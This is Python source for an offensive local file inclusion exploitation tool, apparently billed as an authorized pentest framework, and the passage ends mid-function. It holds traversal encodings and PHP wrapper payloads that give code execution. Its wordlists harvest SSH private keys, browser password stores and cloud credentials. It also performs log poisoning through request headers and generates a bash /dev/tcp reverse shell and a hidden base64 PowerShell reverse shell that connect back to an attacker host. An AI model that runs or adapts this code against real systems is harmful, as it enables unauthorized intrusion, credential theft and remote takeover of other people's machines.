#!/usr/bin/env python3
"""
LFI-Destruction v5.2 – Authorized Penetration Testing Tool
Written By RevShellXD

Modes:
  1) SSH / Browser Artifact Fuzzing (Linux/Windows) – OS‑specific wordlists
  2) Log Poisoning & Reverse Shell (Linux/Windows) – custom payload support
  3) PHPInfo Discovery + File Upload RCE (Race Condition)
  4) Uploaded File Trigger (LFI + existing shell)
  5) PHP Session Enumeration & Hijacking

Modular Mode System: Modes 3-5 are loaded dynamically from the 'modes/' directory.
All core functionality for modes 1 & 2 remains untouched.
"""

import http.client
import re
import sys
import os
import time
import random
import argparse
import json
import socket
import secrets
import base64
import urllib.parse
from urllib.parse import quote_plus, urlparse
from typing import Dict, List, Set, Optional, Tuple
from datetime import datetime

# Optional color support
try:
    from colorama import init, Fore, Style
    init(autoreset=True)
    COLORS = True
except ImportError:
    class Fore:
        RED = GREEN = YELLOW = BLUE = MAGENTA = CYAN = WHITE = ''
    class Style:
        BRIGHT = DIM = NORMAL = RESET_ALL = ''
    COLORS = False


class LFI_SSH_Fuzzer:
    """LFI Exploitation Framework – Core Engine (Modes 1 & 2) + Modular Mode Loader"""

    def __init__(self, advanced_mode: bool = False):
        self.advanced_mode = advanced_mode
        self.config = {
            # ---------- Core ----------
            'method': 'GET',
            'post_param': None,
            'lfi_location': 'param',
            'cookie_name': None,
            'header_name': None,
            'wrapper': 'none',
            'rce_command': 'id',
            'os_type': 'linux',
            'auto_depth': False,
            'wordlist': None,
            'userlist': None,
            'targets_file': None,
            'traversal_depth': 6,
            'max_depth': 2,
            'timeout': 15,
            'rate_limit': 0.5,
            'proxy': None,
            'cookies': {},
            'headers': {},
            'verify_ssl': False,
            'follow_redirects': True,
            # ---------- Encoding ----------
            'encoding': 'none',
            'user_encoding': None,
            # ---------- Log poisoning ----------
            'log_poisoning': False,
            'log_vector': None,
            'log_header': None,
            'log_param': 'test',
            'log_path': None,
            'log_payload_token': None,
            'log_files': None,
            'custom_reverse_shell': None,
            # ---------- Mode selection ----------
            'selected_mode': None,
        }

        self.user_agents = self._load_user_agents()
        self.request_count = 0
        self.found_artifacts = []
        self.session_cookies = {}
        self.start_time = datetime.now()

        # ---------- EXPANDED WINDOWS FALLBACK USERNAMES (48) ----------
        self.WINDOWS_USER_FALLBACK = [
            'Public', 'Administrator', 'user', 'defaultuser0', 'test', 'vagrant', 'dev',
            'Matt',
            'admin', 'backup', 'svc', 'service', 'sql', 'mysql', 'postgres', 'oracle',
            'tomcat', 'jenkins', 'git', 'svn', 'ftp', 'www', 'web', 'deploy', 'app',
            'john', 'jane', 'support', 'helpdesk', 'sales', 'marketing', 'hr', 'finance',
            'operator', 'audit', 'sysadmin', 'root', 'guest', 'default', 'ssh', 'docker',
            'ubuntu', 'centos', 'redhat', 'fedora', 'debian', 'kali', 'pentest'
        ]

        # ---------- LINUX ARTIFACT PATHS ----------
        self.LINUX_ARTIFACTS = [
            # SSH / Remote Access
            '.ssh/id_rsa',
            '.ssh/id_dsa',
            '.ssh/id_ecdsa',
            '.ssh/id_ed25519',
            '.ssh/id_rsa.pub',
            '.ssh/id_dsa.pub',
            '.ssh/id_ecdsa.pub',
            '.ssh/id_ed25519.pub',
            '.ssh/authorized_keys',
            '.ssh/authorized_keys2',
            '.ssh/known_hosts',
            '.ssh/config',
            '.ssh/id_rsa.bak',
            '.ssh/id_rsa.old',
            '.ssh/id_rsa~',
            '.ssh/.id_rsa.swp',
            '.ssh/id_rsa.tmp',
            '.ssh/id_rsa.1',
            '.ssh/id_rsa.pem',
            '.ssh/identity',
            '.ssh/identity.pub',
            '.ssh/environment',
            '.ssh/rc',
            '.bash_history',
            '.ssh/id_ed25519.bak',
            '.ssh/id_ed25519.old',
            '.ssh/known_hosts.old',
            '.ssh/config.bak',
            '.netrc',
            '.git-credentials',
            '.aws/credentials',
            '.docker/config.json',

            # Firefox
            '.mozilla/firefox/default/logins.json',
            '.mozilla/firefox/default/key4.db',
            '.mozilla/firefox/default/cert9.db',
            '.mozilla/firefox/default-release/logins.json',
            '.mozilla/firefox/default-release/key4.db',
            '.mozilla/firefox/default-release/cert9.db',
            '.mozilla/firefox/dev-edition-default/logins.json',
            '.mozilla/firefox/dev-edition-default/key4.db',
            '.mozilla/firefox/dev-edition-default/cert9.db',

            # Chrome / Chromium
            '.config/google-chrome/Default/Login Data',
            '.config/google-chrome/Default/Cookies',
            '.config/google-chrome/Default/Web Data',
            '.config/google-chrome/Default/History',
            '.config/google-chrome/Local State',
            '.config/chromium/Default/Login Data',
            '.config/chromium/Default/Cookies',
            '.config/chromium/Default/Web Data',
            '.config/chromium/Default/History',
            '.config/chromium/Local State',

            # Brave
            '.config/BraveSoftware/Brave-Browser/Default/Login Data',
            '.config/BraveSoftware/Brave-Browser/Default/Cookies',
            '.config/BraveSoftware/Brave-Browser/Default/Web Data',
            '.config/BraveSoftware/Brave-Browser/Default/History',
            '.config/BraveSoftware/Brave-Browser/Local State',

            # Microsoft Edge (Linux)
            '.config/microsoft-edge/Default/Login Data',
            '.config/microsoft-edge/Default/Cookies',
            '.config/microsoft-edge/Default/Web Data',
            '.config/microsoft-edge/Default/History',
            '.config/microsoft-edge/Local State',
        ]

        # ---------- WINDOWS ARTIFACT PATHS (relative to Users/username/) ----------
        self.WINDOWS_ARTIFACTS = [
            # OpenSSH
            '.ssh/id_rsa',
            '.ssh/id_dsa',
            '.ssh/id_ecdsa',
            '.ssh/id_ed25519',
            '.ssh/id_rsa.pub',
            '.ssh/id_dsa.pub',
            '.ssh/id_ecdsa.pub',
            '.ssh/id_ed25519.pub',
            '.ssh/authorized_keys',
            '.ssh/known_hosts',
            '.ssh/config',
            '.ssh/id_rsa.ppk',
            '.ssh/id_rsa.bak',
            '.ssh/id_rsa.old',
            '.ssh/id_rsa~',
            '.ssh/.id_rsa.swp',
            '.ssh/id_rsa.tmp',
            '.ssh/id_rsa.1',
            '.ssh/id_rsa.pem',
            '.ssh/administrators_authorized_keys',

            # PuTTY (common locations)
            '.ssh/id_rsa.ppk',
            'putty/id_rsa.ppk',
            'putty/private.ppk',
            'Desktop/*.ppk',
            'Documents/*.ppk',
            'Downloads/*.ppk',

            # WinSCP
            'AppData/Roaming/WinSCP.ini',

            # FileZilla
            'AppData/Roaming/FileZilla/recentservers.xml',
            'AppData/Roaming/FileZilla/sitemanager.xml',

            # Firefox
            'AppData/Roaming/Mozilla/Firefox/Profiles/default/logins.json',
            'AppData/Roaming/Mozilla/Firefox/Profiles/default/key4.db',
            'AppData/Roaming/Mozilla/Firefox/Profiles/default/cert9.db',
            'AppData/Roaming/Mozilla/Firefox/Profiles/default-release/logins.json',
            'AppData/Roaming/Mozilla/Firefox/Profiles/default-release/key4.db',
            'AppData/Roaming/Mozilla/Firefox/Profiles/default-release/cert9.db',
            'AppData/Roaming/Mozilla/Firefox/Profiles/dev-edition-default/logins.json',
            'AppData/Roaming/Mozilla/Firefox/Profiles/dev-edition-default/key4.db',
            'AppData/Roaming/Mozilla/Firefox/Profiles/dev-edition-default/cert9.db',

            # Chrome
            'AppData/Local/Google/Chrome/User Data/Default/Login Data',
            'AppData/Local/Google/Chrome/User Data/Default/Cookies',
            'AppData/Local/Google/Chrome/User Data/Default/Web Data',
            'AppData/Local/Google/Chrome/User Data/Default/History',
            'AppData/Local/Google/Chrome/User Data/Local State',

            # Microsoft Edge
            'AppData/Local/Microsoft/Edge/User Data/Default/Login Data',
            'AppData/Local/Microsoft/Edge/User Data/Default/Cookies',
            'AppData/Local/Microsoft/Edge/User Data/Default/Web Data',
            'AppData/Local/Microsoft/Edge/User Data/Default/History',
            'AppData/Local/Microsoft/Edge/User Data/Local State',

            # Brave
            'AppData/Local/BraveSoftware/Brave-Browser/User Data/Default/Login Data',
            'AppData/Local/BraveSoftware/Brave-Browser/User Data/Default/Cookies',
            'AppData/Local/BraveSoftware/Brave-Browser/User Data/Default/Web Data',
            'AppData/Local/BraveSoftware/Brave-Browser/User Data/Default/History',
            'AppData/Local/BraveSoftware/Brave-Browser/User Data/Local State',

            # VNC / RDP (common)
            '.vnc/passwd',
            'AppData/Local/Microsoft/Credentials/*',
            'AppData/Roaming/Microsoft/Credentials/*',
            'AppData/Roaming/VanDyke/Config/Sessions/*',
        ]

        # ---------- COMPREHENSIVE LOG PATH DATABASE ----------
        self.LOG_PATHS = {
            'linux': [
                'var/log/apache2/access.log',
                'var/log/apache2/error.log',
                'var/log/httpd/access_log',
                'var/log/httpd/error_log',
                'var/log/apache/access.log',
                'var/log/apache/error.log',
                'var/log/nginx/access.log',
                'var/log/nginx/error.log',
                'var/log/auth.log',
                'var/log/secure',
                'var/log/sshd.log',
                'var/log/syslog',
                'var/log/messages',
                'var/log/daemon.log',
                'var/log/kern.log',
                'var/log/proftpd/proftpd.log',
                'var/log/vsftpd.log',
                'var/log/xferlog',
                'var/log/mail.log',
                'var/log/mail.err',
                'var/log/mail.info',
                'var/log/mysql/error.log',
                'var/log/postgresql/postgresql.log',
                'var/log/mariadb/mariadb.log',
                'var/log/php-fpm.log',
                'var/log/php_errors.log',
                'var/log/cloud-init.log',
                'var/log/ufw.log',
                'var/log/alternatives.log',
                'var/log/dpkg.log',
                'var/log/apt/history.log',
                'var/log/btmp',
                'var/log/lastlog',
                'var/log/wtmp',
                'home/*/.bash_history',
                'home/*/.ssh/known_hosts',
                'home/*/.ssh/authorized_keys',
                'home/*/.bashrc',
                'var/log/containers/*.log',
                'var/log/pods/*.log',
            ],
            'windows': [
                'xampp/apache/logs/access.log',
                'xampp/apache/logs/error.log',
                'xampp/php/logs/php_error_log',
                'xampp/mysql/data/mysql_error.log',
                'wamp64/logs/access.log',
                'wamp64/logs/apache_error.log',
                'wamp64/logs/php_error.log',
                'wamp64/logs/mysql.log',
                'inetpub/logs/LogFiles/W3SVC1/u_ex%y%m%d.log',
                'inetpub/logs/LogFiles/W3SVC2/u_ex%y%m%d.log',
                'Windows/System32/LogFiles/HTTPERR/httperr*.log',
                'Windows/System32/LogFiles/W3SVC1/*.log',
                'Windows/debug/NetSetup.log',
                'Windows/debug/DCPROMO.LOG',
                'Windows/setupact.log',
                'Windows/WindowsUpdate.log',
                'Users/Public/Documents/*.log',
                'Users/Default/*.log',
                'Program Files/Apache Group/Apache2/logs/error.log',
                'Program Files/Apache Group/Apache2/logs/access.log',
                'Program Files (x86)/Apache Software Foundation/Apache2.4/logs/error.log',
                'Program Files (x86)/Apache Software Foundation/Apache2.4/logs/access.log',
                'Program Files/Apache Software Foundation/Tomcat 9.0/logs/access.log',
                'Program Files/Apache Software Foundation/Tomcat 9.0/logs/catalina.out',
                'nginx/logs/access.log',
                'nginx/logs/error.log',
            ]
        }

        # ---------- Patterns for PHP "file not found" errors ----------
        self.NOT_FOUND_PATTERNS = [
            'failed to open stream',
            'No such file',
            'Permission denied',
            'include(): Failed opening'
        ]

        # ---------- Color setup ----------
        if COLORS:
            self.colors = {
                'info': Fore.CYAN,
                'success': Fore.GREEN + Style.BRIGHT,
                'warning': Fore.YELLOW,
                'error': Fore.RED + Style.BRIGHT,
                'debug': Fore.MAGENTA,
                'highlight': Fore.WHITE + Style.BRIGHT,
                'banner': Fore.BLUE + Style.BRIGHT
            }
        else:
            self.colors = {k: '' for k in self.colors.keys()}

    # -------------------------------------------------------------------------
    #   HELPER FUNCTIONS
    # -------------------------------------------------------------------------
    def _load_user_agents(self) -> List[str]:
        default = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'curl/7.88.1',
        ]
        if self.advanced_mode:
            for fname in ['user_agents.txt', 'ua.txt']:
                if os.path.exists(fname):
                    try:
                        with open(fname, 'r', encoding='utf-8', errors='ignore') as f:
                            agents = [line.strip() for line in f if line.strip() and not line.startswith('#')]
                        if agents:
                            self._print(f"[*] Loaded {len(agents)} user agents from {fname}", 'info')
                            return agents + default
                    except Exception as e:
                        self._print(f"[-] Error loading {fname}: {e}", 'error')
        return default

    def _get_user_agent(self) -> str:
        return random.choice(self.user_agents) if self.user_agents else "LFI-SSH-Fuzzer/1.0"

    def _apply_rate_limit(self):
        if self.config['rate_limit'] > 0:
            time.sleep(self.config['rate_limit'])

    def _print(self, msg: str, level: str = 'info', end: str = '\n'):
        color = self.colors.get(level, '')
        reset = Style.RESET_ALL if COLORS else ''
        print(f"{color}{msg}{reset}", end=end)

    # -------------------------------------------------------------------------
    #   ENCODING – FORWARD SLASH ONLY, PRESERVE DOTS
    # -------------------------------------------------------------------------
    def encode_payload(self, payload: str, encoding: str, user_encoding: str = None) -> str:
        """Apply selected encoding – forward‑slash based, works on all OS."""
        traversal = '../'

        if encoding == 'none':
            return payload
        elif encoding == 'single':
            reps = [
                (traversal, '%2e%2e%2f'),
                (traversal, '..%2f'),
                (traversal, '%2e%2e/'),
            ]
            for p, r in reps:
                payload = payload.replace(p, r)
            return payload
        elif encoding == 'double':
            return payload.replace(traversal, '%252e%252e%252f')
        elif encoding == 'custom_double':
            return payload.replace(traversal, '%%32%65%%32%65/')
        elif encoding == 'unicode':
            reps = [
                (traversal, '..∕'),
                (traversal, '..／'),
                (traversal, '..⧸'),
                (traversal, '%u002e%u002e/'),
                (traversal, '%c0%ae%c0%ae%c0%af'),
            ]
            for p, r in reps:
                payload = payload.replace(p, r)
            return payload
        elif encoding == 'user_custom' and user_encoding:
            return payload.replace(traversal, user_encoding)
        return payload

    def _apply_wrapper(self, payload: str) -> str:
        w = self.config['wrapper']
        if w == 'none':
            return payload
        elif w == 'php_filter':
            return f"php://filter/convert.base64-encode/resource={payload}"
        elif w == 'php_data' and self.config['rce_command']:
            php = f"<?php system('{self.config['rce_command']}'); ?>"
            enc = base64.b64encode(php.encode()).decode()
            return f"data://text/plain;base64,{enc}"
        elif w == 'expect' and self.config['rce_command']:
            return f"expect://{self.config['rce_command']}"
        return payload

    # -------------------------------------------------------------------------
    #   HTTP REQUEST HANDLER
    # -------------------------------------------------------------------------
    def _create_connection(self, protocol: str, host: str, port: int):
        if self.config['proxy'] and protocol == 'http':
            p = urlparse(self.config['proxy'])
            return http.client.HTTPConnection(p.hostname, p.port or 8080, timeout=self.config['timeout'])
        if protocol == 'https':
            return http.client.HTTPSConnection(host, port, timeout=self.config['timeout'])
        else:
            return http.client.HTTPConnection(host, port, timeout=self.config['timeout'])

    def send_http_request(self, protocol: str, host: str, port: int, path: str,
                          body: str = None, verbose: bool = False) -> Tuple[Optional[int], Optional[str]]:
        self.request_count += 1
        self._apply_rate_limit()

        try:
            headers = {
                'User-Agent': self._get_user_agent(),
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate',
                'Connection': 'close',
                'Cache-Control': 'no-cache'
            }
            headers.update(self.config['headers'])
            if self.config['cookies']:
                headers['Cookie'] = '; '.join(f"{k}={v}" for k, v in self.config['cookies'].items())
            elif self.session_cookies:
                headers['Cookie'] = '; '.join(f"{k}={v}" for k, v in self.session_cookies.items())

            method = self.config['method']
            if method == 'POST' and self.config['post_param'] and not body:
                body = f"{self.config['post_param']}={quote_plus(path)}"
                path = self.config.get('base_path', '/')

            conn = self._create_connection(protocol, host, port)
            if method == 'POST':
                headers['Content-Type'] = 'application/x-www-form-urlencoded'
                headers['Content-Length'] = str(len(body))
                conn.request("POST", path, body=body, headers=headers)
            else:
                conn.request("GET", path, headers=headers)

            resp = conn.getresponse()
            status = resp.status

            if status in [301, 302, 303, 307, 308] and self.config['follow_redirects']:
                loc = resp.getheader('Location')
                if loc:
                    conn.close()
                    if loc.startswith('http'):
                        u = urlparse(loc)
                        return self.send_http_request(
                            u.scheme, u.hostname, u.port or (443 if u.scheme == 'https' else 80),
                            u.path + ('?' + u.query if u.query else ''), body, verbose
                        )
                    elif loc.startswith('/'):
                        return self.send_http_request(protocol, host, port, loc, body, verbose)

            content = resp.read()
            if resp.getheader('Content-Encoding') == 'gzip':
                import gzip
                import io
                content = gzip.GzipFile(fileobj=io.BytesIO(content)).read()
            content = content.decode('utf-8', errors='ignore')

            set_cookie = resp.getheader('Set-Cookie')
            if set_cookie:
                parts = set_cookie.split(';')[0].split('=')
                if len(parts) == 2:
                    self.session_cookies[parts[0].strip()] = parts[1].strip()

            conn.close()
            return status, content

        except socket.timeout:
            if verbose:
                self._print(f"[DEBUG] Timeout for {path}", 'debug')
            return None, None
        except Exception as e:
            if verbose:
                self._print(f"[DEBUG] Request error for {path}: {e}", 'debug')
            return None, None

    # -------------------------------------------------------------------------
    #   LFI INJECTION – NO DOUBLE‑ENCODING, PRESERVES DOTS
    # -------------------------------------------------------------------------
    def _inject_lfi_payload(self, payload: str, base_url: str, param_name: str = None) -> str:
        loc = self.config['lfi_location']
        if loc == 'param':
            if self.config['encoding'] == 'none':
                # Encode the entire payload as a query parameter value.
                # Preserve safe characters: dot (.), underscore (_), hyphen (-), tilde (~)
                safe_chars = '._-~'
                encoded = urllib.parse.quote(payload, safe=safe_chars)
                return f"{base_url}?{param_name}={encoded}"
            else:
                # Already percent-encoded – append as-is
                return f"{base_url}?{param_name}={payload}"
        elif loc == 'cookie':
            name = self.config['cookie_name'] or param_name or 'file'
            self.config['cookies'][name] = payload
            return base_url
        elif loc == 'header':
            name = self.config['header_name'] or param_name or 'X-LFI'
            self.config['headers'][name] = payload
            return base_url
        return base_url

    # -------------------------------------------------------------------------
    #   ARTIFACT DETECTION
    # -------------------------------------------------------------------------
    def parse_passwd(self, content: str) -> List[Dict]:
        users = []
        for line in content.splitlines():
            parts = line.split(':')
            if len(parts) < 7:
                continue
            u, _, _, _, _, home, shell = parts
            if u and u != 'root' and shell not in ['/usr/sbin/nologin', '/bin/false', '/sbin/nologin']:
                users.append({'username': u, 'home': home})
        return users

    def is_directory_listing(self, content: str) -> bool:
        patterns = [
            r'<title>\s*Index of',
            r'Directory listing for',
            r'Parent Directory</a>',
            r'<img src="[^"]*blank\.(gif|png|ico)"',
            r'Last modified</th>',
            r'<a href="\?C=[A-Z];O=[A-Z]">'
        ]
        return sum(1 for p in patterns if re.search(p, content, re.IGNORECASE)) >= 2

    def extract_filenames_from_listing(self, content: str) -> List[str]:
        files = []
        for pat in [r'href="([^"?][^"]*)"', r'>\s*([^<\s]+?)\s*</a>', r'<td><a[^>]*>([^<]+)</a></td>']:
            for m in re.findall(pat, content, re.IGNORECASE):
                if isinstance(m, tuple):
                    f = m[0] or m[1]
                else:
                    f = m
                if f and f not in ['../', './', '/', '..', '.'] and not f.startswith('?'):
                    clean = f.split('"')[0].split('#')[0].split('?')[0]
                    if clean and clean.lower() not in ['name', 'last modified', 'size']:
                        files.append(clean)
        return list(set(files))

    def is_ssh_artifact(self, content: str) -> bool:
        priv = [
            r'-----BEGIN [A-Z ]*PRIVATE KEY-----',
            r'BEGIN OPENSSH PRIVATE KEY',
            r'BEGIN RSA PRIVATE KEY',
            r'BEGIN DSA PRIVATE KEY',
            r'BEGIN EC PRIVATE KEY'
        ]
        pub = ['ssh-rsa', 'ssh-ed25519', 'ecdsa-sha2-nistp256', 'ssh-dss']
        for p in priv:
            if re.search(p, content):
                return True
        for line in content.splitlines():
            line = line.strip()
            for p in pub:
                if line.startswith(p):
                    return True
        if re.search(r'^\S+ (ssh-(rsa|dss|ed25519) )?AAAA[^ ]+', content, re.MULTILINE):
            return True
        for kw in ['host ', 'identityfile', 'pubkeyauthentication', 'authorizedkeysfile']:
            if kw in content.lower():
                return True
        return False

    def is_windows_artifact(self, content: str) -> bool:
        win = [r'\[fonts\]', r'\[extensions\]', r'\[mail\]', r'boot loader', r'operating systems', r'version=5\.']
        return any(re.search(p, content, re.IGNORECASE) for p in win)

    def save_artifact(self, user: str, path: str, content: str, status: int):
        if not os.path.exists('artifacts'):
            os.makedirs('artifacts')
        fname = os.path.basename(path) or 'unknown'
        safe_user = re.sub(r'[^a-zA-Z0-9_.-]', '_', user)
        safe_file = re.sub(r'[^a-zA-Z0-9_.-]', '_', fname)
        filepath = f"artifacts/{safe_user}_{safe_file}"
        cnt = 1
        while os.path.exists(filepath):
            filepath = f"artifacts/{safe_user}_{safe_file}_{cnt}"
            cnt += 1
        with open(filepath, 'w', encoding='utf-8') as f:
            f.write(content)
        self.found_artifacts.append({
            'user': user,
            'original_path': path,
            'saved_path': filepath,
            'http_status': status,
            'size': len(content),
            'timestamp': datetime.now().isoformat()
        })
        self._print(f"[+] Saved artifact to {filepath} ({len(content)} bytes)", 'success')

    def save_results(self, output_file: str = None):
        if not output_file:
            output_file = f"scan_results_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        data = {
            'scan_start': self.start_time.isoformat(),
            'scan_end': datetime.now().isoformat(),
            'total_requests': self.request_count,
            'artifacts_found': len(self.found_artifacts),
            'artifacts': self.found_artifacts,
            'config': self.config
        }
        with open(output_file, 'w', encoding='utf-8') as f:
            json.dump(data, f, indent=2, default=str)
        self._print(f"[+] Results saved to {output_file}", 'success')

    # -------------------------------------------------------------------------
    #   SSH / BROWSER RECURSIVE FUZZING
    # -------------------------------------------------------------------------
    def recursive_fuzz(self, protocol: str, host: str, port: int, base_url: str,
                       encoding: str, user_encoding: str, user: str, path: str,
                       depth: int, max_depth: int, visited: Set, lfi_type: str,
                       param_name: str = None, verbose: bool = False):
        if depth > max_depth or path in visited:
            return
        visited.add(path)

        encoded = self.encode_payload(path, encoding, user_encoding).lstrip('/')
        if self.config['wrapper'] != 'none':
            encoded = self._apply_wrapper(encoded)

        if lfi_type == 'path':
            full = base_url.rstrip('/') + '/' + encoded.lstrip('/')
        else:
            full = self._inject_lfi_payload(encoded, base_url, param_name)

        status, content = self.send_http_request(protocol, host, port, full, verbose=verbose)
        if status is None or status == 404:
            return
        if status not in [200, 403, 400, 401, 500, 301, 302, 206]:
            return

        if path.endswith('/') and self.is_directory_listing(content):
            self._print(f"[*] Directory listing at {full} (depth {depth})", 'info')
            for fname in self.extract_filenames_from_listing(content):
                if fname in ['../', './', '/', '..', '.']:
                    continue
                new = path + fname if not fname.startswith('/') else fname.lstrip('/')
                if fname.endswith('/') and not new.endswith('/'):
                    new += '/'
                self.recursive_fuzz(protocol, host, port, base_url, encoding, user_encoding,
                                    user, new, depth + 1, max_depth, visited, lfi_type,
                                    param_name, verbose)
        else:
            if self.is_ssh_artifact(content) or \
               (self.config['os_type'] == 'windows' and self.is_windows_artifact(content)):
                self._print(f"[+] Artifact for {user} at {full} (HTTP {status})", 'success')
                self.save_artifact(user, path, content, status)
            elif verbose and content.strip():
                self._print(f"[DEBUG] No artifact at {full}", 'debug')

    # -------------------------------------------------------------------------
    #   AUTO DEPTH DETECTION
    # -------------------------------------------------------------------------
    def find_traversal_depth(self, config: Dict) -> int:
        if self.config['os_type'] == 'linux':
            test_file = 'etc/passwd'
            valid_str = 'root:x:0:0'
        else:
            test_file = 'Windows/win.ini'
            valid_str = '[fonts]'

        for d in range(1, 16):
            prefix = '../' * d
            payload = prefix + test_file
            enc = self.encode_payload(payload, config['encoding'], config['user_encoding'])
            if config['lfi_type'] == 'path':
                full = config['base_url'].rstrip('/') + '/' + enc.lstrip('/')
            else:
                full = self._inject_lfi_payload(enc, config['base_url'], config['param_name'])
            status, content = self.send_http_request(config['protocol'], config['host'],
                                                     config['port'], full, verbose=False)
            if status == 200 and content and valid_str in content:
                self._print(f"[+] Working traversal depth: {d}", 'success')
                return d
        self._print("[-] Auto-depth failed, using default 6", 'warning')
        return 6

    # -------------------------------------------------------------------------
    #   LOG POISONING & REVERSE SHELL (CUSTOM PAYLOAD SUPPORT)
    # -------------------------------------------------------------------------
    def _generate_reverse_shell_payload(self, lhost: str, lport: int) -> str:
        """Generate OS‑specific reverse shell command – uses custom payload if provided."""
        if self.config.get('custom_reverse_shell'):
            try:
                return self.config['custom_reverse_shell'].format(lhost=lhost, lport=lport)
            except:
                return self.config['custom_reverse_shell']
        if self.config['os_type'] == 'linux':
            return f"bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'"
        else:
            ps_payload = f'''$client = New-Object System.Net.Sockets.TCPClient("{lhost}",{lport});
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{{0}};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
}};
$client.Close()'''
            encoded = base64.b64encode(ps_payload.encode('utf-16le')).decode()
            return f"powershell -nop -w hidden -e {encoded}"

    def _attempt_reverse_shell(self, config: Dict, log_path: str):
        self._print("\n" + "=" * 60, 'highlight')
        self._print("[!] LOG POISONING SUCCESSFUL! Ready to escalate to reverse shell.", 'success')
        self._print("=" * 60, 'highlight')
        self._print("\n[+] A backdoor has been placed in the log file.", 'info')
        self._print("[+] You can now execute arbitrary system commands via the 'cmd' parameter.", 'info')
        self._print("\n" + "-" * 60)
        input("1. Set up your netcat listener (e.g., nc -lvnp 4444) and press Enter to continue...")
        print()

        lhost = input("Enter your LHOST (IP address for reverse connection): ").strip()
        while True:
            lport_str = input("Enter your LPORT (default 4444): ").strip()
            if not lport_str:
                lport = 4444
                break
            try:
                lport = int(lport_str)
                if 1 <= lport <= 65535:
                    break
                else:
                    self._print("Port must be 1-65535", 'error')
            except ValueError:
                self._print("Invalid port number", 'error')

        self._print(f"\n[*] Generating reverse shell payload for {self.config['os_type'].upper()} target...", 'info')
        rev_cmd = self._generate_reverse_shell_payload(lhost, lport)

        traversal_prefix = config['traversal_prefix']
        lfi_payload = traversal_prefix + log_path.lstrip('/')
        encoded = self.encode_payload(lfi_payload, self.config['encoding'], self.config['user_encoding'])
        if self.config['wrapper'] != 'none':
            encoded = self._apply_wrapper(encoded)

        if config['lfi_type'] == 'path':
            cmd_url = config['base_url'].rstrip('/') + '/' + encoded.lstrip('/')
            cmd_url += f"?cmd={quote_plus(rev_cmd)}"
        else:
            base = self._inject_lfi_payload(encoded, config['base_url'], config['param_name'])
            if '?' in base:
                cmd_url = base + f"&cmd={quote_plus(rev_cmd)}"
            else:
                cmd_url = base + f"?cmd={quote_plus(rev_cmd)}"

        self._print(f"\n[*] Sending reverse shell payload to {cmd_url}", 'info')
        self._print("[*] Check your listener – you should receive a shell shortly!\n", 'success')

        status, content = self.send_http_request(config['protocol'], config['host'], config['port'],
                                                 cmd_url, verbose=config['verbose'])
        if status and status < 500:
            self._print("[+] Payload delivered. Shell should be connecting...", 'success')
        else:
            self._print("[-] Failed to deliver payload. Check the URL and try again.", 'error')

    def inject_log_payload(self, protocol: str, host: str, port: int, base_url: str,
                           traversal_prefix: str, payload: str, verbose: bool = False) -> bool:
        url = base_url.rstrip('/') + '/'

        orig_method = self.config['method']
        orig_location = self.config['lfi_location']
        orig_headers = self.config['headers'].copy()
        orig_cookies = self.config['cookies'].copy()

        self.config['method'] = 'GET'
        self.config['lfi_location'] = 'param'

        if self.config['log_vector'] == 'ua':
            self.config['headers']['User-Agent'] = payload
        elif self.config['log_vector'] == 'referer':
            self.config['headers']['Referer'] = payload
        elif self.config['log_vector'] == 'xff':
            self.config['headers']['X-Forwarded-For'] = payload
        elif self.config['log_vector'] == 'header':
            hdr = self.config['log_header'] or 'X-Inject'
            self.config['headers'][hdr] = payload
        elif self.config['log_vector'] == 'param':
            param = self.config['log_param'] or 'test'
            url += f"?{param}={quote_plus(payload)}"

        status, content = self.send_http_request(protocol, host, port, url, verbose=verbose)

        self.config['method'] = orig_method
        self.config['lfi_location'] = orig_location
        self.config['headers'] = orig_headers
        self.config['cookies'] = orig_cookies

        return status is not None and status < 500

    def try_include_log(self, protocol: str, host: str, port: int, base_url: str,
                        traversal_prefix: str, log_path: str, token: str,
                        lfi_type: str, param_name: str = None, verbose: bool = False) -> bool:
        lfi_payload = traversal_prefix + log_path.lstrip('/')
        encoded = self.encode_payload(lfi_payload, self.config['encoding'], self.config['user_encoding'])
        if self.config['wrapper'] != 'none':
            encoded = self._apply_wrapper(encoded)

        if lfi_type == 'path':
            full = base_url.rstrip('/') + '/' + encoded.lstrip('/')
        else:
            full = self._inject_lfi_payload(encoded, base_url, param_name)

        status, content = self.send_http_request(protocol, host, port, full, verbose=verbose)
        if status == 200 and content and token in content:
            self._print(f"[+] SUCCESS! Log file {log_path} contains token {token}", 'success')
            self.save_artifact("log_poison", log_path, content, status)
            return True
        return False

    def fuzz_log_poisoning(self, config: Dict, dry_run: bool = False):
        if dry_run:
            self._print("[*] DRY RUN: Log poisoning would be attempted", 'info')
            return

        self._print("\n" + "=" * 60, 'highlight')
        self._print("[*] STARTING LOG POISONING FUZZ", 'highlight')
        self._print("=" * 60, 'highlight')

        if not self.config['log_vector']:
            self.config['log_vector'] = 'ua'
            self._print(f"[*] No log vector selected, using default: User-Agent", 'info')

        token = "LFI_" + secrets.token_hex(8)
        php_test = f"<?php echo '{token}'; ?>"
        self.config['log_payload_token'] = token

        log_paths = []
        if self.config.get('log_files'):
            try:
                with open(self.config['log_files'], 'r', encoding='utf-8', errors='ignore') as f:
                    log_paths = [line.strip() for line in f if line.strip() and not line.startswith('#')]
